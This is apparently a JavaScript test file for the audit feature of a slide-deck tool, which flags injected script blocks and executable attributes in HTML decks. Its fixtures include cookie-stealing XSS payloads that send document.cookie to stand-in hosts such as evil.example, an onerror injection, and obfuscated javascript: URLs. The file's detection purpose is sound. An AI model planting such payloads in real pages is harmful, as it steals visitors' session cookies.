// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// The ingredients label (MARKETPLACE.md PRESENT#AUDIT). Two things have to
// hold at once and pull against each other: every executing block is named,
// and nothing inert is. A label that cried wolf on cast JSON would be turned
// off within a day, and one that missed an appended <script> is worse than
// none — so the false-positive tests carry as much weight here as the attack.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync, writeFileSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { classifyScripts, auditDeck, formatLabel, isBootCall, runtimeVersion, installedRuntime, executableAttributes } from '../cli/audit.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.resolve(here, '..');
const CLI = path.join(ROOT, 'cli/decklight.mjs');

const kinds = (html) => classifyScripts(html).map((b) => b.kind);

// ── what each block IS ─────────────────────────────────────────────────────

test('the runtime is found by its marker, and by shape when unmarked', () => {
  const marked = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init()</script>`;
  assert.deepEqual(kinds(marked), ['runtime', 'boot']);

  // bundle writes a BARE <script> for the runtime, so the fallback locator
  // (upgrade's, shared) is the common path, not the exotic one
  const bare = `<script>var Decklight = {}</script>
<script>Decklight.init()</script>`;
  assert.deepEqual(kinds(bare), ['runtime', 'boot']);
});

test('a source deck loads the runtime by src, and says so', () => {
  const html = `<script src="../dist/decklight.js"></script><script>Decklight.init()</script>`;
  assert.deepEqual(kinds(html), ['runtime-src', 'boot']);
  const r = auditDeck(html).runtime;
  assert.equal(r.kind, 'external');
  assert.equal(r.state, 'not-inlined', 'a file we never see is not a file we can hash');
});

test('JSON and template blocks are data, not findings', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script type="application/json" id="cast-one">{"v":2}</script>
<script type="application/json" data-decklight-visemes="slide-01">{}</script>
<script type="application/json" data-decklight-voices="v/m.json">{}</script>
<script type="text/template">## not markup the browser runs</script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.data, 3);
  assert.equal(report.counts.template, 1);
  assert.equal(report.counts.unaccounted, 0, 'no browser executes any of those');
  assert.deepEqual(
    classifyScripts(html).filter((b) => b.kind === 'data').map((b) => b.subtype),
    ['cast', 'visemes', 'voice manifest']);
});

test('theme <style> blocks are counted as inventory, never as script', () => {
  const html = `<head><style data-decklight-runtime="css">.decklight{}</style>
<style data-theme="aurora">a{}</style><style data-theme="midnight">b{}</style></head>
<body><script data-decklight-runtime="js">var Decklight = {}</script></body>`;
  assert.equal(auditDeck(html).themes, 2);
});

// ── the boot call: matched by shape, not by mention ─────────────────────────

test('isBootCall accepts what the scaffolder writes', () => {
  assert.ok(isBootCall('Decklight.init()'));
  assert.ok(isBootCall('Decklight.init({ transition: "fade" });'));
  assert.ok(isBootCall('const deck = Decklight.init({\n  pinTitles: true,\n});'));
  assert.ok(isBootCall('// a leading comment\nDecklight.init();'));
  assert.ok(isBootCall('/* block */ Decklight.init({ a: ")" });'), 'a paren in a string does not end the call');
});

test('isBootCall refuses anything riding along after the call', () => {
  // the whole reason it is a shape test: "mentions Decklight.init" would pass
  // every one of these
  assert.equal(isBootCall('Decklight.init(); fetch("//evil")'), false);
  assert.equal(isBootCall('fetch("//evil"); Decklight.init()'), false);
  assert.equal(isBootCall('Decklight.init()\ndocument.cookie'), false);
  assert.equal(isBootCall('if (x) Decklight.init()'), false);
});

test('an init block with extra code is unaccounted, not boot', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init(); navigator.sendBeacon("//evil", document.cookie)</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.boot, 0);
  assert.equal(report.counts.unaccounted, 1);
  assert.match(report.unaccounted[0].snippet, /sendBeacon/);
});

// ── the attack the whole wave exists for ───────────────────────────────────

test('an appended <script> is named with its line and its opening bytes', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init()</script>
<script>fetch("//evil.example/" + document.cookie)</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 1);
  const [found] = report.unaccounted;
  assert.equal(found.line, 3, 'the coordinate a person can act on');
  assert.match(found.snippet, /evil\.example/);
  assert.ok(found.bytes > 0);
});

test('a third-party src= is named too — it executes and it is not ours', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script src="https://cdn.example/analytics.js"></script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 1);
  assert.match(report.unaccounted[0].snippet, /cdn\.example/);
});

test('a script hiding behind an unknown type is still named', () => {
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script type="text/javascript ">fetch("//evil")</script>`;
  assert.equal(auditDeck(html).counts.unaccounted, 1);
});

// ── executable attributes: the vector that never needs a block ─────────────

test('an inline onerror handler is named, with its line and its tag', () => {
  // The convenient injection: no <script> anywhere, so the block scan sees
  // nothing — and 'unsafe-inline' in the CSP is exactly what lets it run.
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<script>Decklight.init()</script>
<img src=x onerror="fetch('//evil.example/' + document.cookie)">`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 0, 'no script BLOCK was added — that is the point of the vector');
  assert.equal(report.counts.handlers, 1);
  const [h] = report.handlers;
  assert.equal(h.line, 3, 'the coordinate a person can act on');
  assert.equal(h.tag, 'img');
  assert.equal(h.attr, 'onerror');
  assert.match(h.snippet, /evil\.example/);
});

test('a javascript: URL is named; a data: image is not', () => {
  const html = `<a href="javascript:alert(1)">click me</a>
<img src="data:image/png;base64,iVBORw0KGgo=">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`;
  const found = executableAttributes(html);
  assert.deepEqual(found.map((f) => [f.tag, f.attr]), [['a', 'href'], ['iframe', 'src']],
    'a data: IMAGE is how every bundled deck inlines its pictures — flagging it would cry wolf on all of them');
});

test('entity and whitespace games do not hide a javascript: URL', () => {
  // Browsers decode character references and strip control characters before
  // reading the scheme, so the scan has to see the value the way they do.
  for (const href of ['JaVaScRiPt:alert(1)', 'jav&#x61;script:alert(1)', '&#106;avascript:alert(1)', 'java\tscript:alert(1)', '  javascript:alert(1)']) {
    assert.equal(executableAttributes(`<a href="${href}">x</a>`).length, 1, href);
  }
  assert.equal(executableAttributes('<a href="https://example.com/javascript:notascheme">x</a>').length, 0,
    'javascript: mid-path is a path, not a scheme');
});

test('an inline srcdoc document is named — it inherits the deck CSP', () => {
  const found = executableAttributes('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>');
  assert.equal(found.length, 1);
  assert.equal(found[0].attr, 'srcdoc');
});

test('handlers mentioned in prose, comments, code samples and script text are not findings', () => {
  // The mask that keeps the label credible: none of these is an attribute on
  // a real tag, and a label that cried wolf on a slide ABOUT XSS would be
  // turned off within a day.
  const html = `<script data-decklight-runtime="js">var Decklight = {}; var s = '<img src=x onerror=alert(1)>';</script>
<!-- beware onerror="never" on an <img src=x onerror=nope> -->
<p>write onclick="…" on the element to wire a handler</p>
<p alt="the string onclick=x inside a value is a value">ok</p>
<pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
<style>/* onload="x" is css text */</style>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.handlers, 0);
  assert.equal(report.counts.unaccounted, 0);
});

test('a quoted > inside an attribute does not end the tag scan early', () => {
  // data-chart JSON legitimately contains ">" — a tag walker that stopped
  // there would misread everything after it.
  const html = `<section data-chart='{"a":"x > y"}' onclick="steal()"><h2>t</h2></section>`;
  const found = executableAttributes(html);
  assert.equal(found.length, 1);
  assert.equal(found[0].attr, 'onclick');
});

test('the label names executable attributes, and says so when there are none', () => {
  const clean = `<script data-decklight-runtime="js">var Decklight = {}</script><script>Decklight.init()</script>`;
  assert.match(formatLabel(auditDeck(clean)).join('\n'), /0 inline handlers or executable URLs in attributes/,
    'the zero line is what states this class of content was examined at all');
  const dirty = clean + `\n<img src=x onerror="fetch('//evil')">`;
  const text = formatLabel(auditDeck(dirty)).join('\n');
  assert.match(text, /1 executable attribute — this file runs code outside any script block/);
  assert.match(text, /line\s+2\s+<img>\s+onerror=/);
});

// ── the false positives that would kill it ─────────────────────────────────

test('a comment that TALKS about <script> is not a script block', () => {
  // demo/smoke.html's slide-15 comment says "its text lives inside a <script>",
  // and a raw scan pairs that mention with the real </script> below it,
  // inventing a block that spans the gap — a phantom finding on a clean deck.
  const html = `<script data-decklight-runtime="js">var Decklight = {}</script>
<!-- its text lives inside a <script>, which the math scanner skips -->
<script type="application/json" id="cast-one">{"v":2}</script>
<script>Decklight.init()</script>`;
  const report = auditDeck(html);
  assert.equal(report.counts.unaccounted, 0);
  assert.equal(report.counts.data, 1);
});

test('every shipped deck reports only its own author script — no phantoms', () => {
  // The decks npm run verify renders. Their genuine author blocks (the
  // showcase quiz, smoke's probes) SHOULD be named — that is the label
  // working. What must not appear is a finding pointing at data or comments.
  for (const rel of ['demo/intro.html', 'demo/showcase.html', 'demo/smoke.html']) {
    const report = auditDeck(readFileSync(path.join(ROOT, rel), 'utf8'));
    for (const b of report.unaccounted) {
      assert.ok(b.bytes > 0, `${rel}:${b.line} — a zero-byte finding is a parse artifact`);
      assert.doesNotMatch(b.snippet, /^[,)\]}]/, `${rel}:${b.line} — a finding starting mid-expression is a mis-paired match`);
    }
    assert.ok(report.counts.data > 0, `${rel} has cast/manifest JSON, and it is counted as data`);
    assert.equal(report.counts.handlers, 0,
      `${rel} — no shipped deck carries an inline handler, so any finding here is a phantom: ${JSON.stringify(report.handlers)}`);
  }
  assert.equal(auditDeck(readFileSync(path.join(ROOT, 'demo/intro.html'), 'utf8')).counts.unaccounted, 0,
    'intro.html carries no author script at all');
});

// ── the runtime hash ───────────────────────────────────────────────────────

test('the version is read from the build banner', () => {
  assert.equal(runtimeVersion('/*! Decklight v1.2.3 — Copyright */ var Decklight'), '1.2.3');
  assert.equal(runtimeVersion('<p>no runtime here</p>'), null);
});

test('a deck bundled from this install hashes identical to it', () => {
  const installed = installedRuntime();
  assert.ok(installed, 'dist/ is built (npm run build) — the comparison needs something to compare to');
  const html = `<script>${installed.text}</script><script>Decklight.init()</script>`;
  const r = auditDeck(html).runtime;
  assert.equal(r.state, 'matches');
  assert.equal(r.hash, installed.hash);
});

test('a tampered runtime of the same version reads as differing, not matching', () => {
  const installed = installedRuntime();
  const html = `<script>${installed.text}\n/* injected */</script><script>Decklight.init()</script>`;
  const r = auditDeck(html).runtime;
  assert.equal(r.state, 'differs');
  assert.notEqual(r.hash, installed.hash);
});

test('a runtime from another version is reported as not comparable, not as a mismatch', () => {
  // The honest three-valued answer. This package can vouch for the build it
  // ships and nothing else; calling an older release "DIFFERS" would read as
  // an accusation against a perfectly good deck.
  const installed = installedRuntime();
  const html = `<script>/*! Decklight v0.0.1 */ var Decklight = {}</script><script>Decklight.init()</script>`;
  const r = auditDeck(html, { installed }).runtime;
  assert.equal(r.state, 'other-version');
  assert.equal(r.version, '0.0.1');
});

// ── an inventory, never a verdict ──────────────────────────────────────────

test('the label states what is there and never grades it', () => {
  const clean = `<script data-decklight-runtime="js">var Decklight = {}</script><script>Decklight.init()</script>`;
  const dirty = clean + '<script>fetch("//evil")</script>';
  for (const html of [clean, dirty]) {
    const text = formatLabel(auditDeck(html)).join('\n');
    assert.doesNotMatch(text, /\bsafe\b|\bclean\b|\btrusted\b|\bverified\b|\bsecure\b/i,
      'no verdict vocabulary — the scan is a heuristic over a file someone may have edited');
    assert.doesNotMatch(text, /[✔✓✅❌⚠]/, 'and no check marks either');
  }
  assert.match(formatLabel(auditDeck(clean)).join('\n'), /0 unaccounted script blocks/,
    'a clean deck gets a count, not a blessing');
});

// ── the CI face ────────────────────────────────────────────────────────────

const run = (args) => {
  try {
    return { code: 0, out: execFileSync(process.execPath, [CLI, ...args], { encoding: 'utf8', stdio: 'pipe' }) };
  } catch (e) { return { code: e.status, out: String(e.stdout) + String(e.stderr) }; }
};

test('--check exits 0 on a deck that runs only the runtime', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  const installed = installedRuntime();
  writeFileSync(deck, `<div class="decklight"></div><script>${installed.text}</script><script>Decklight.init()</script>`);
  const { code, out } = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(code, 0);
  assert.match(out, /identical to this install/);
  assert.match(out, /0 unaccounted/);
});

test('--check exits non-zero and names the block, from any directory', () => {
  // deliberately outside the cwd: --check reads one file and serves nothing,
  // so the server's "deck must live under the current directory" rule must
  // not apply to it
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
<script>fetch("//evil.example/" + document.cookie)</script>`);
  const { code, out } = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(code, 1);
  assert.match(out, /1 unaccounted script block/);
  assert.match(out, /line\s+2\s+.*evil\.example/);
});

test('--check exits non-zero on an inline handler, even with 0 unaccounted blocks', () => {
  // The gap this whole ticket is about: the label used to print "0 unaccounted
  // script blocks" and exit 0 while the handler ran in front of the audience.
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
<img src=x onerror="fetch('//evil.example/' + document.cookie)">`);
  const { code, out } = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(code, 1);
  assert.match(out, /0 unaccounted script blocks/, 'the block count is honest — there is no block');
  assert.match(out, /1 executable attribute/);
  assert.match(out, /line\s+2\s+<img>\s+onerror=/);
});

test('--check on a real bundled deck is quiet, and loud once tampered with', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-audit-'));
  const deck = path.join(dir, 'talk.html');
  const bundled = run(['bundle', path.join(ROOT, 'demo/intro.html'), '-o', deck]);
  assert.equal(bundled.code, 0, bundled.out);

  const before = run(['present', '--check', deck]);
  assert.equal(before.code, 0, before.out);
  assert.match(before.out, /0 unaccounted/);

  writeFileSync(deck, readFileSync(deck, 'utf8') + '\n<script>alert(1)</script>\n');
  const after = run(['present', '--check', deck]);
  rmSync(dir, { recursive: true, force: true });
  assert.equal(after.code, 1);
  assert.match(after.out, /alert\(1\)/);
});
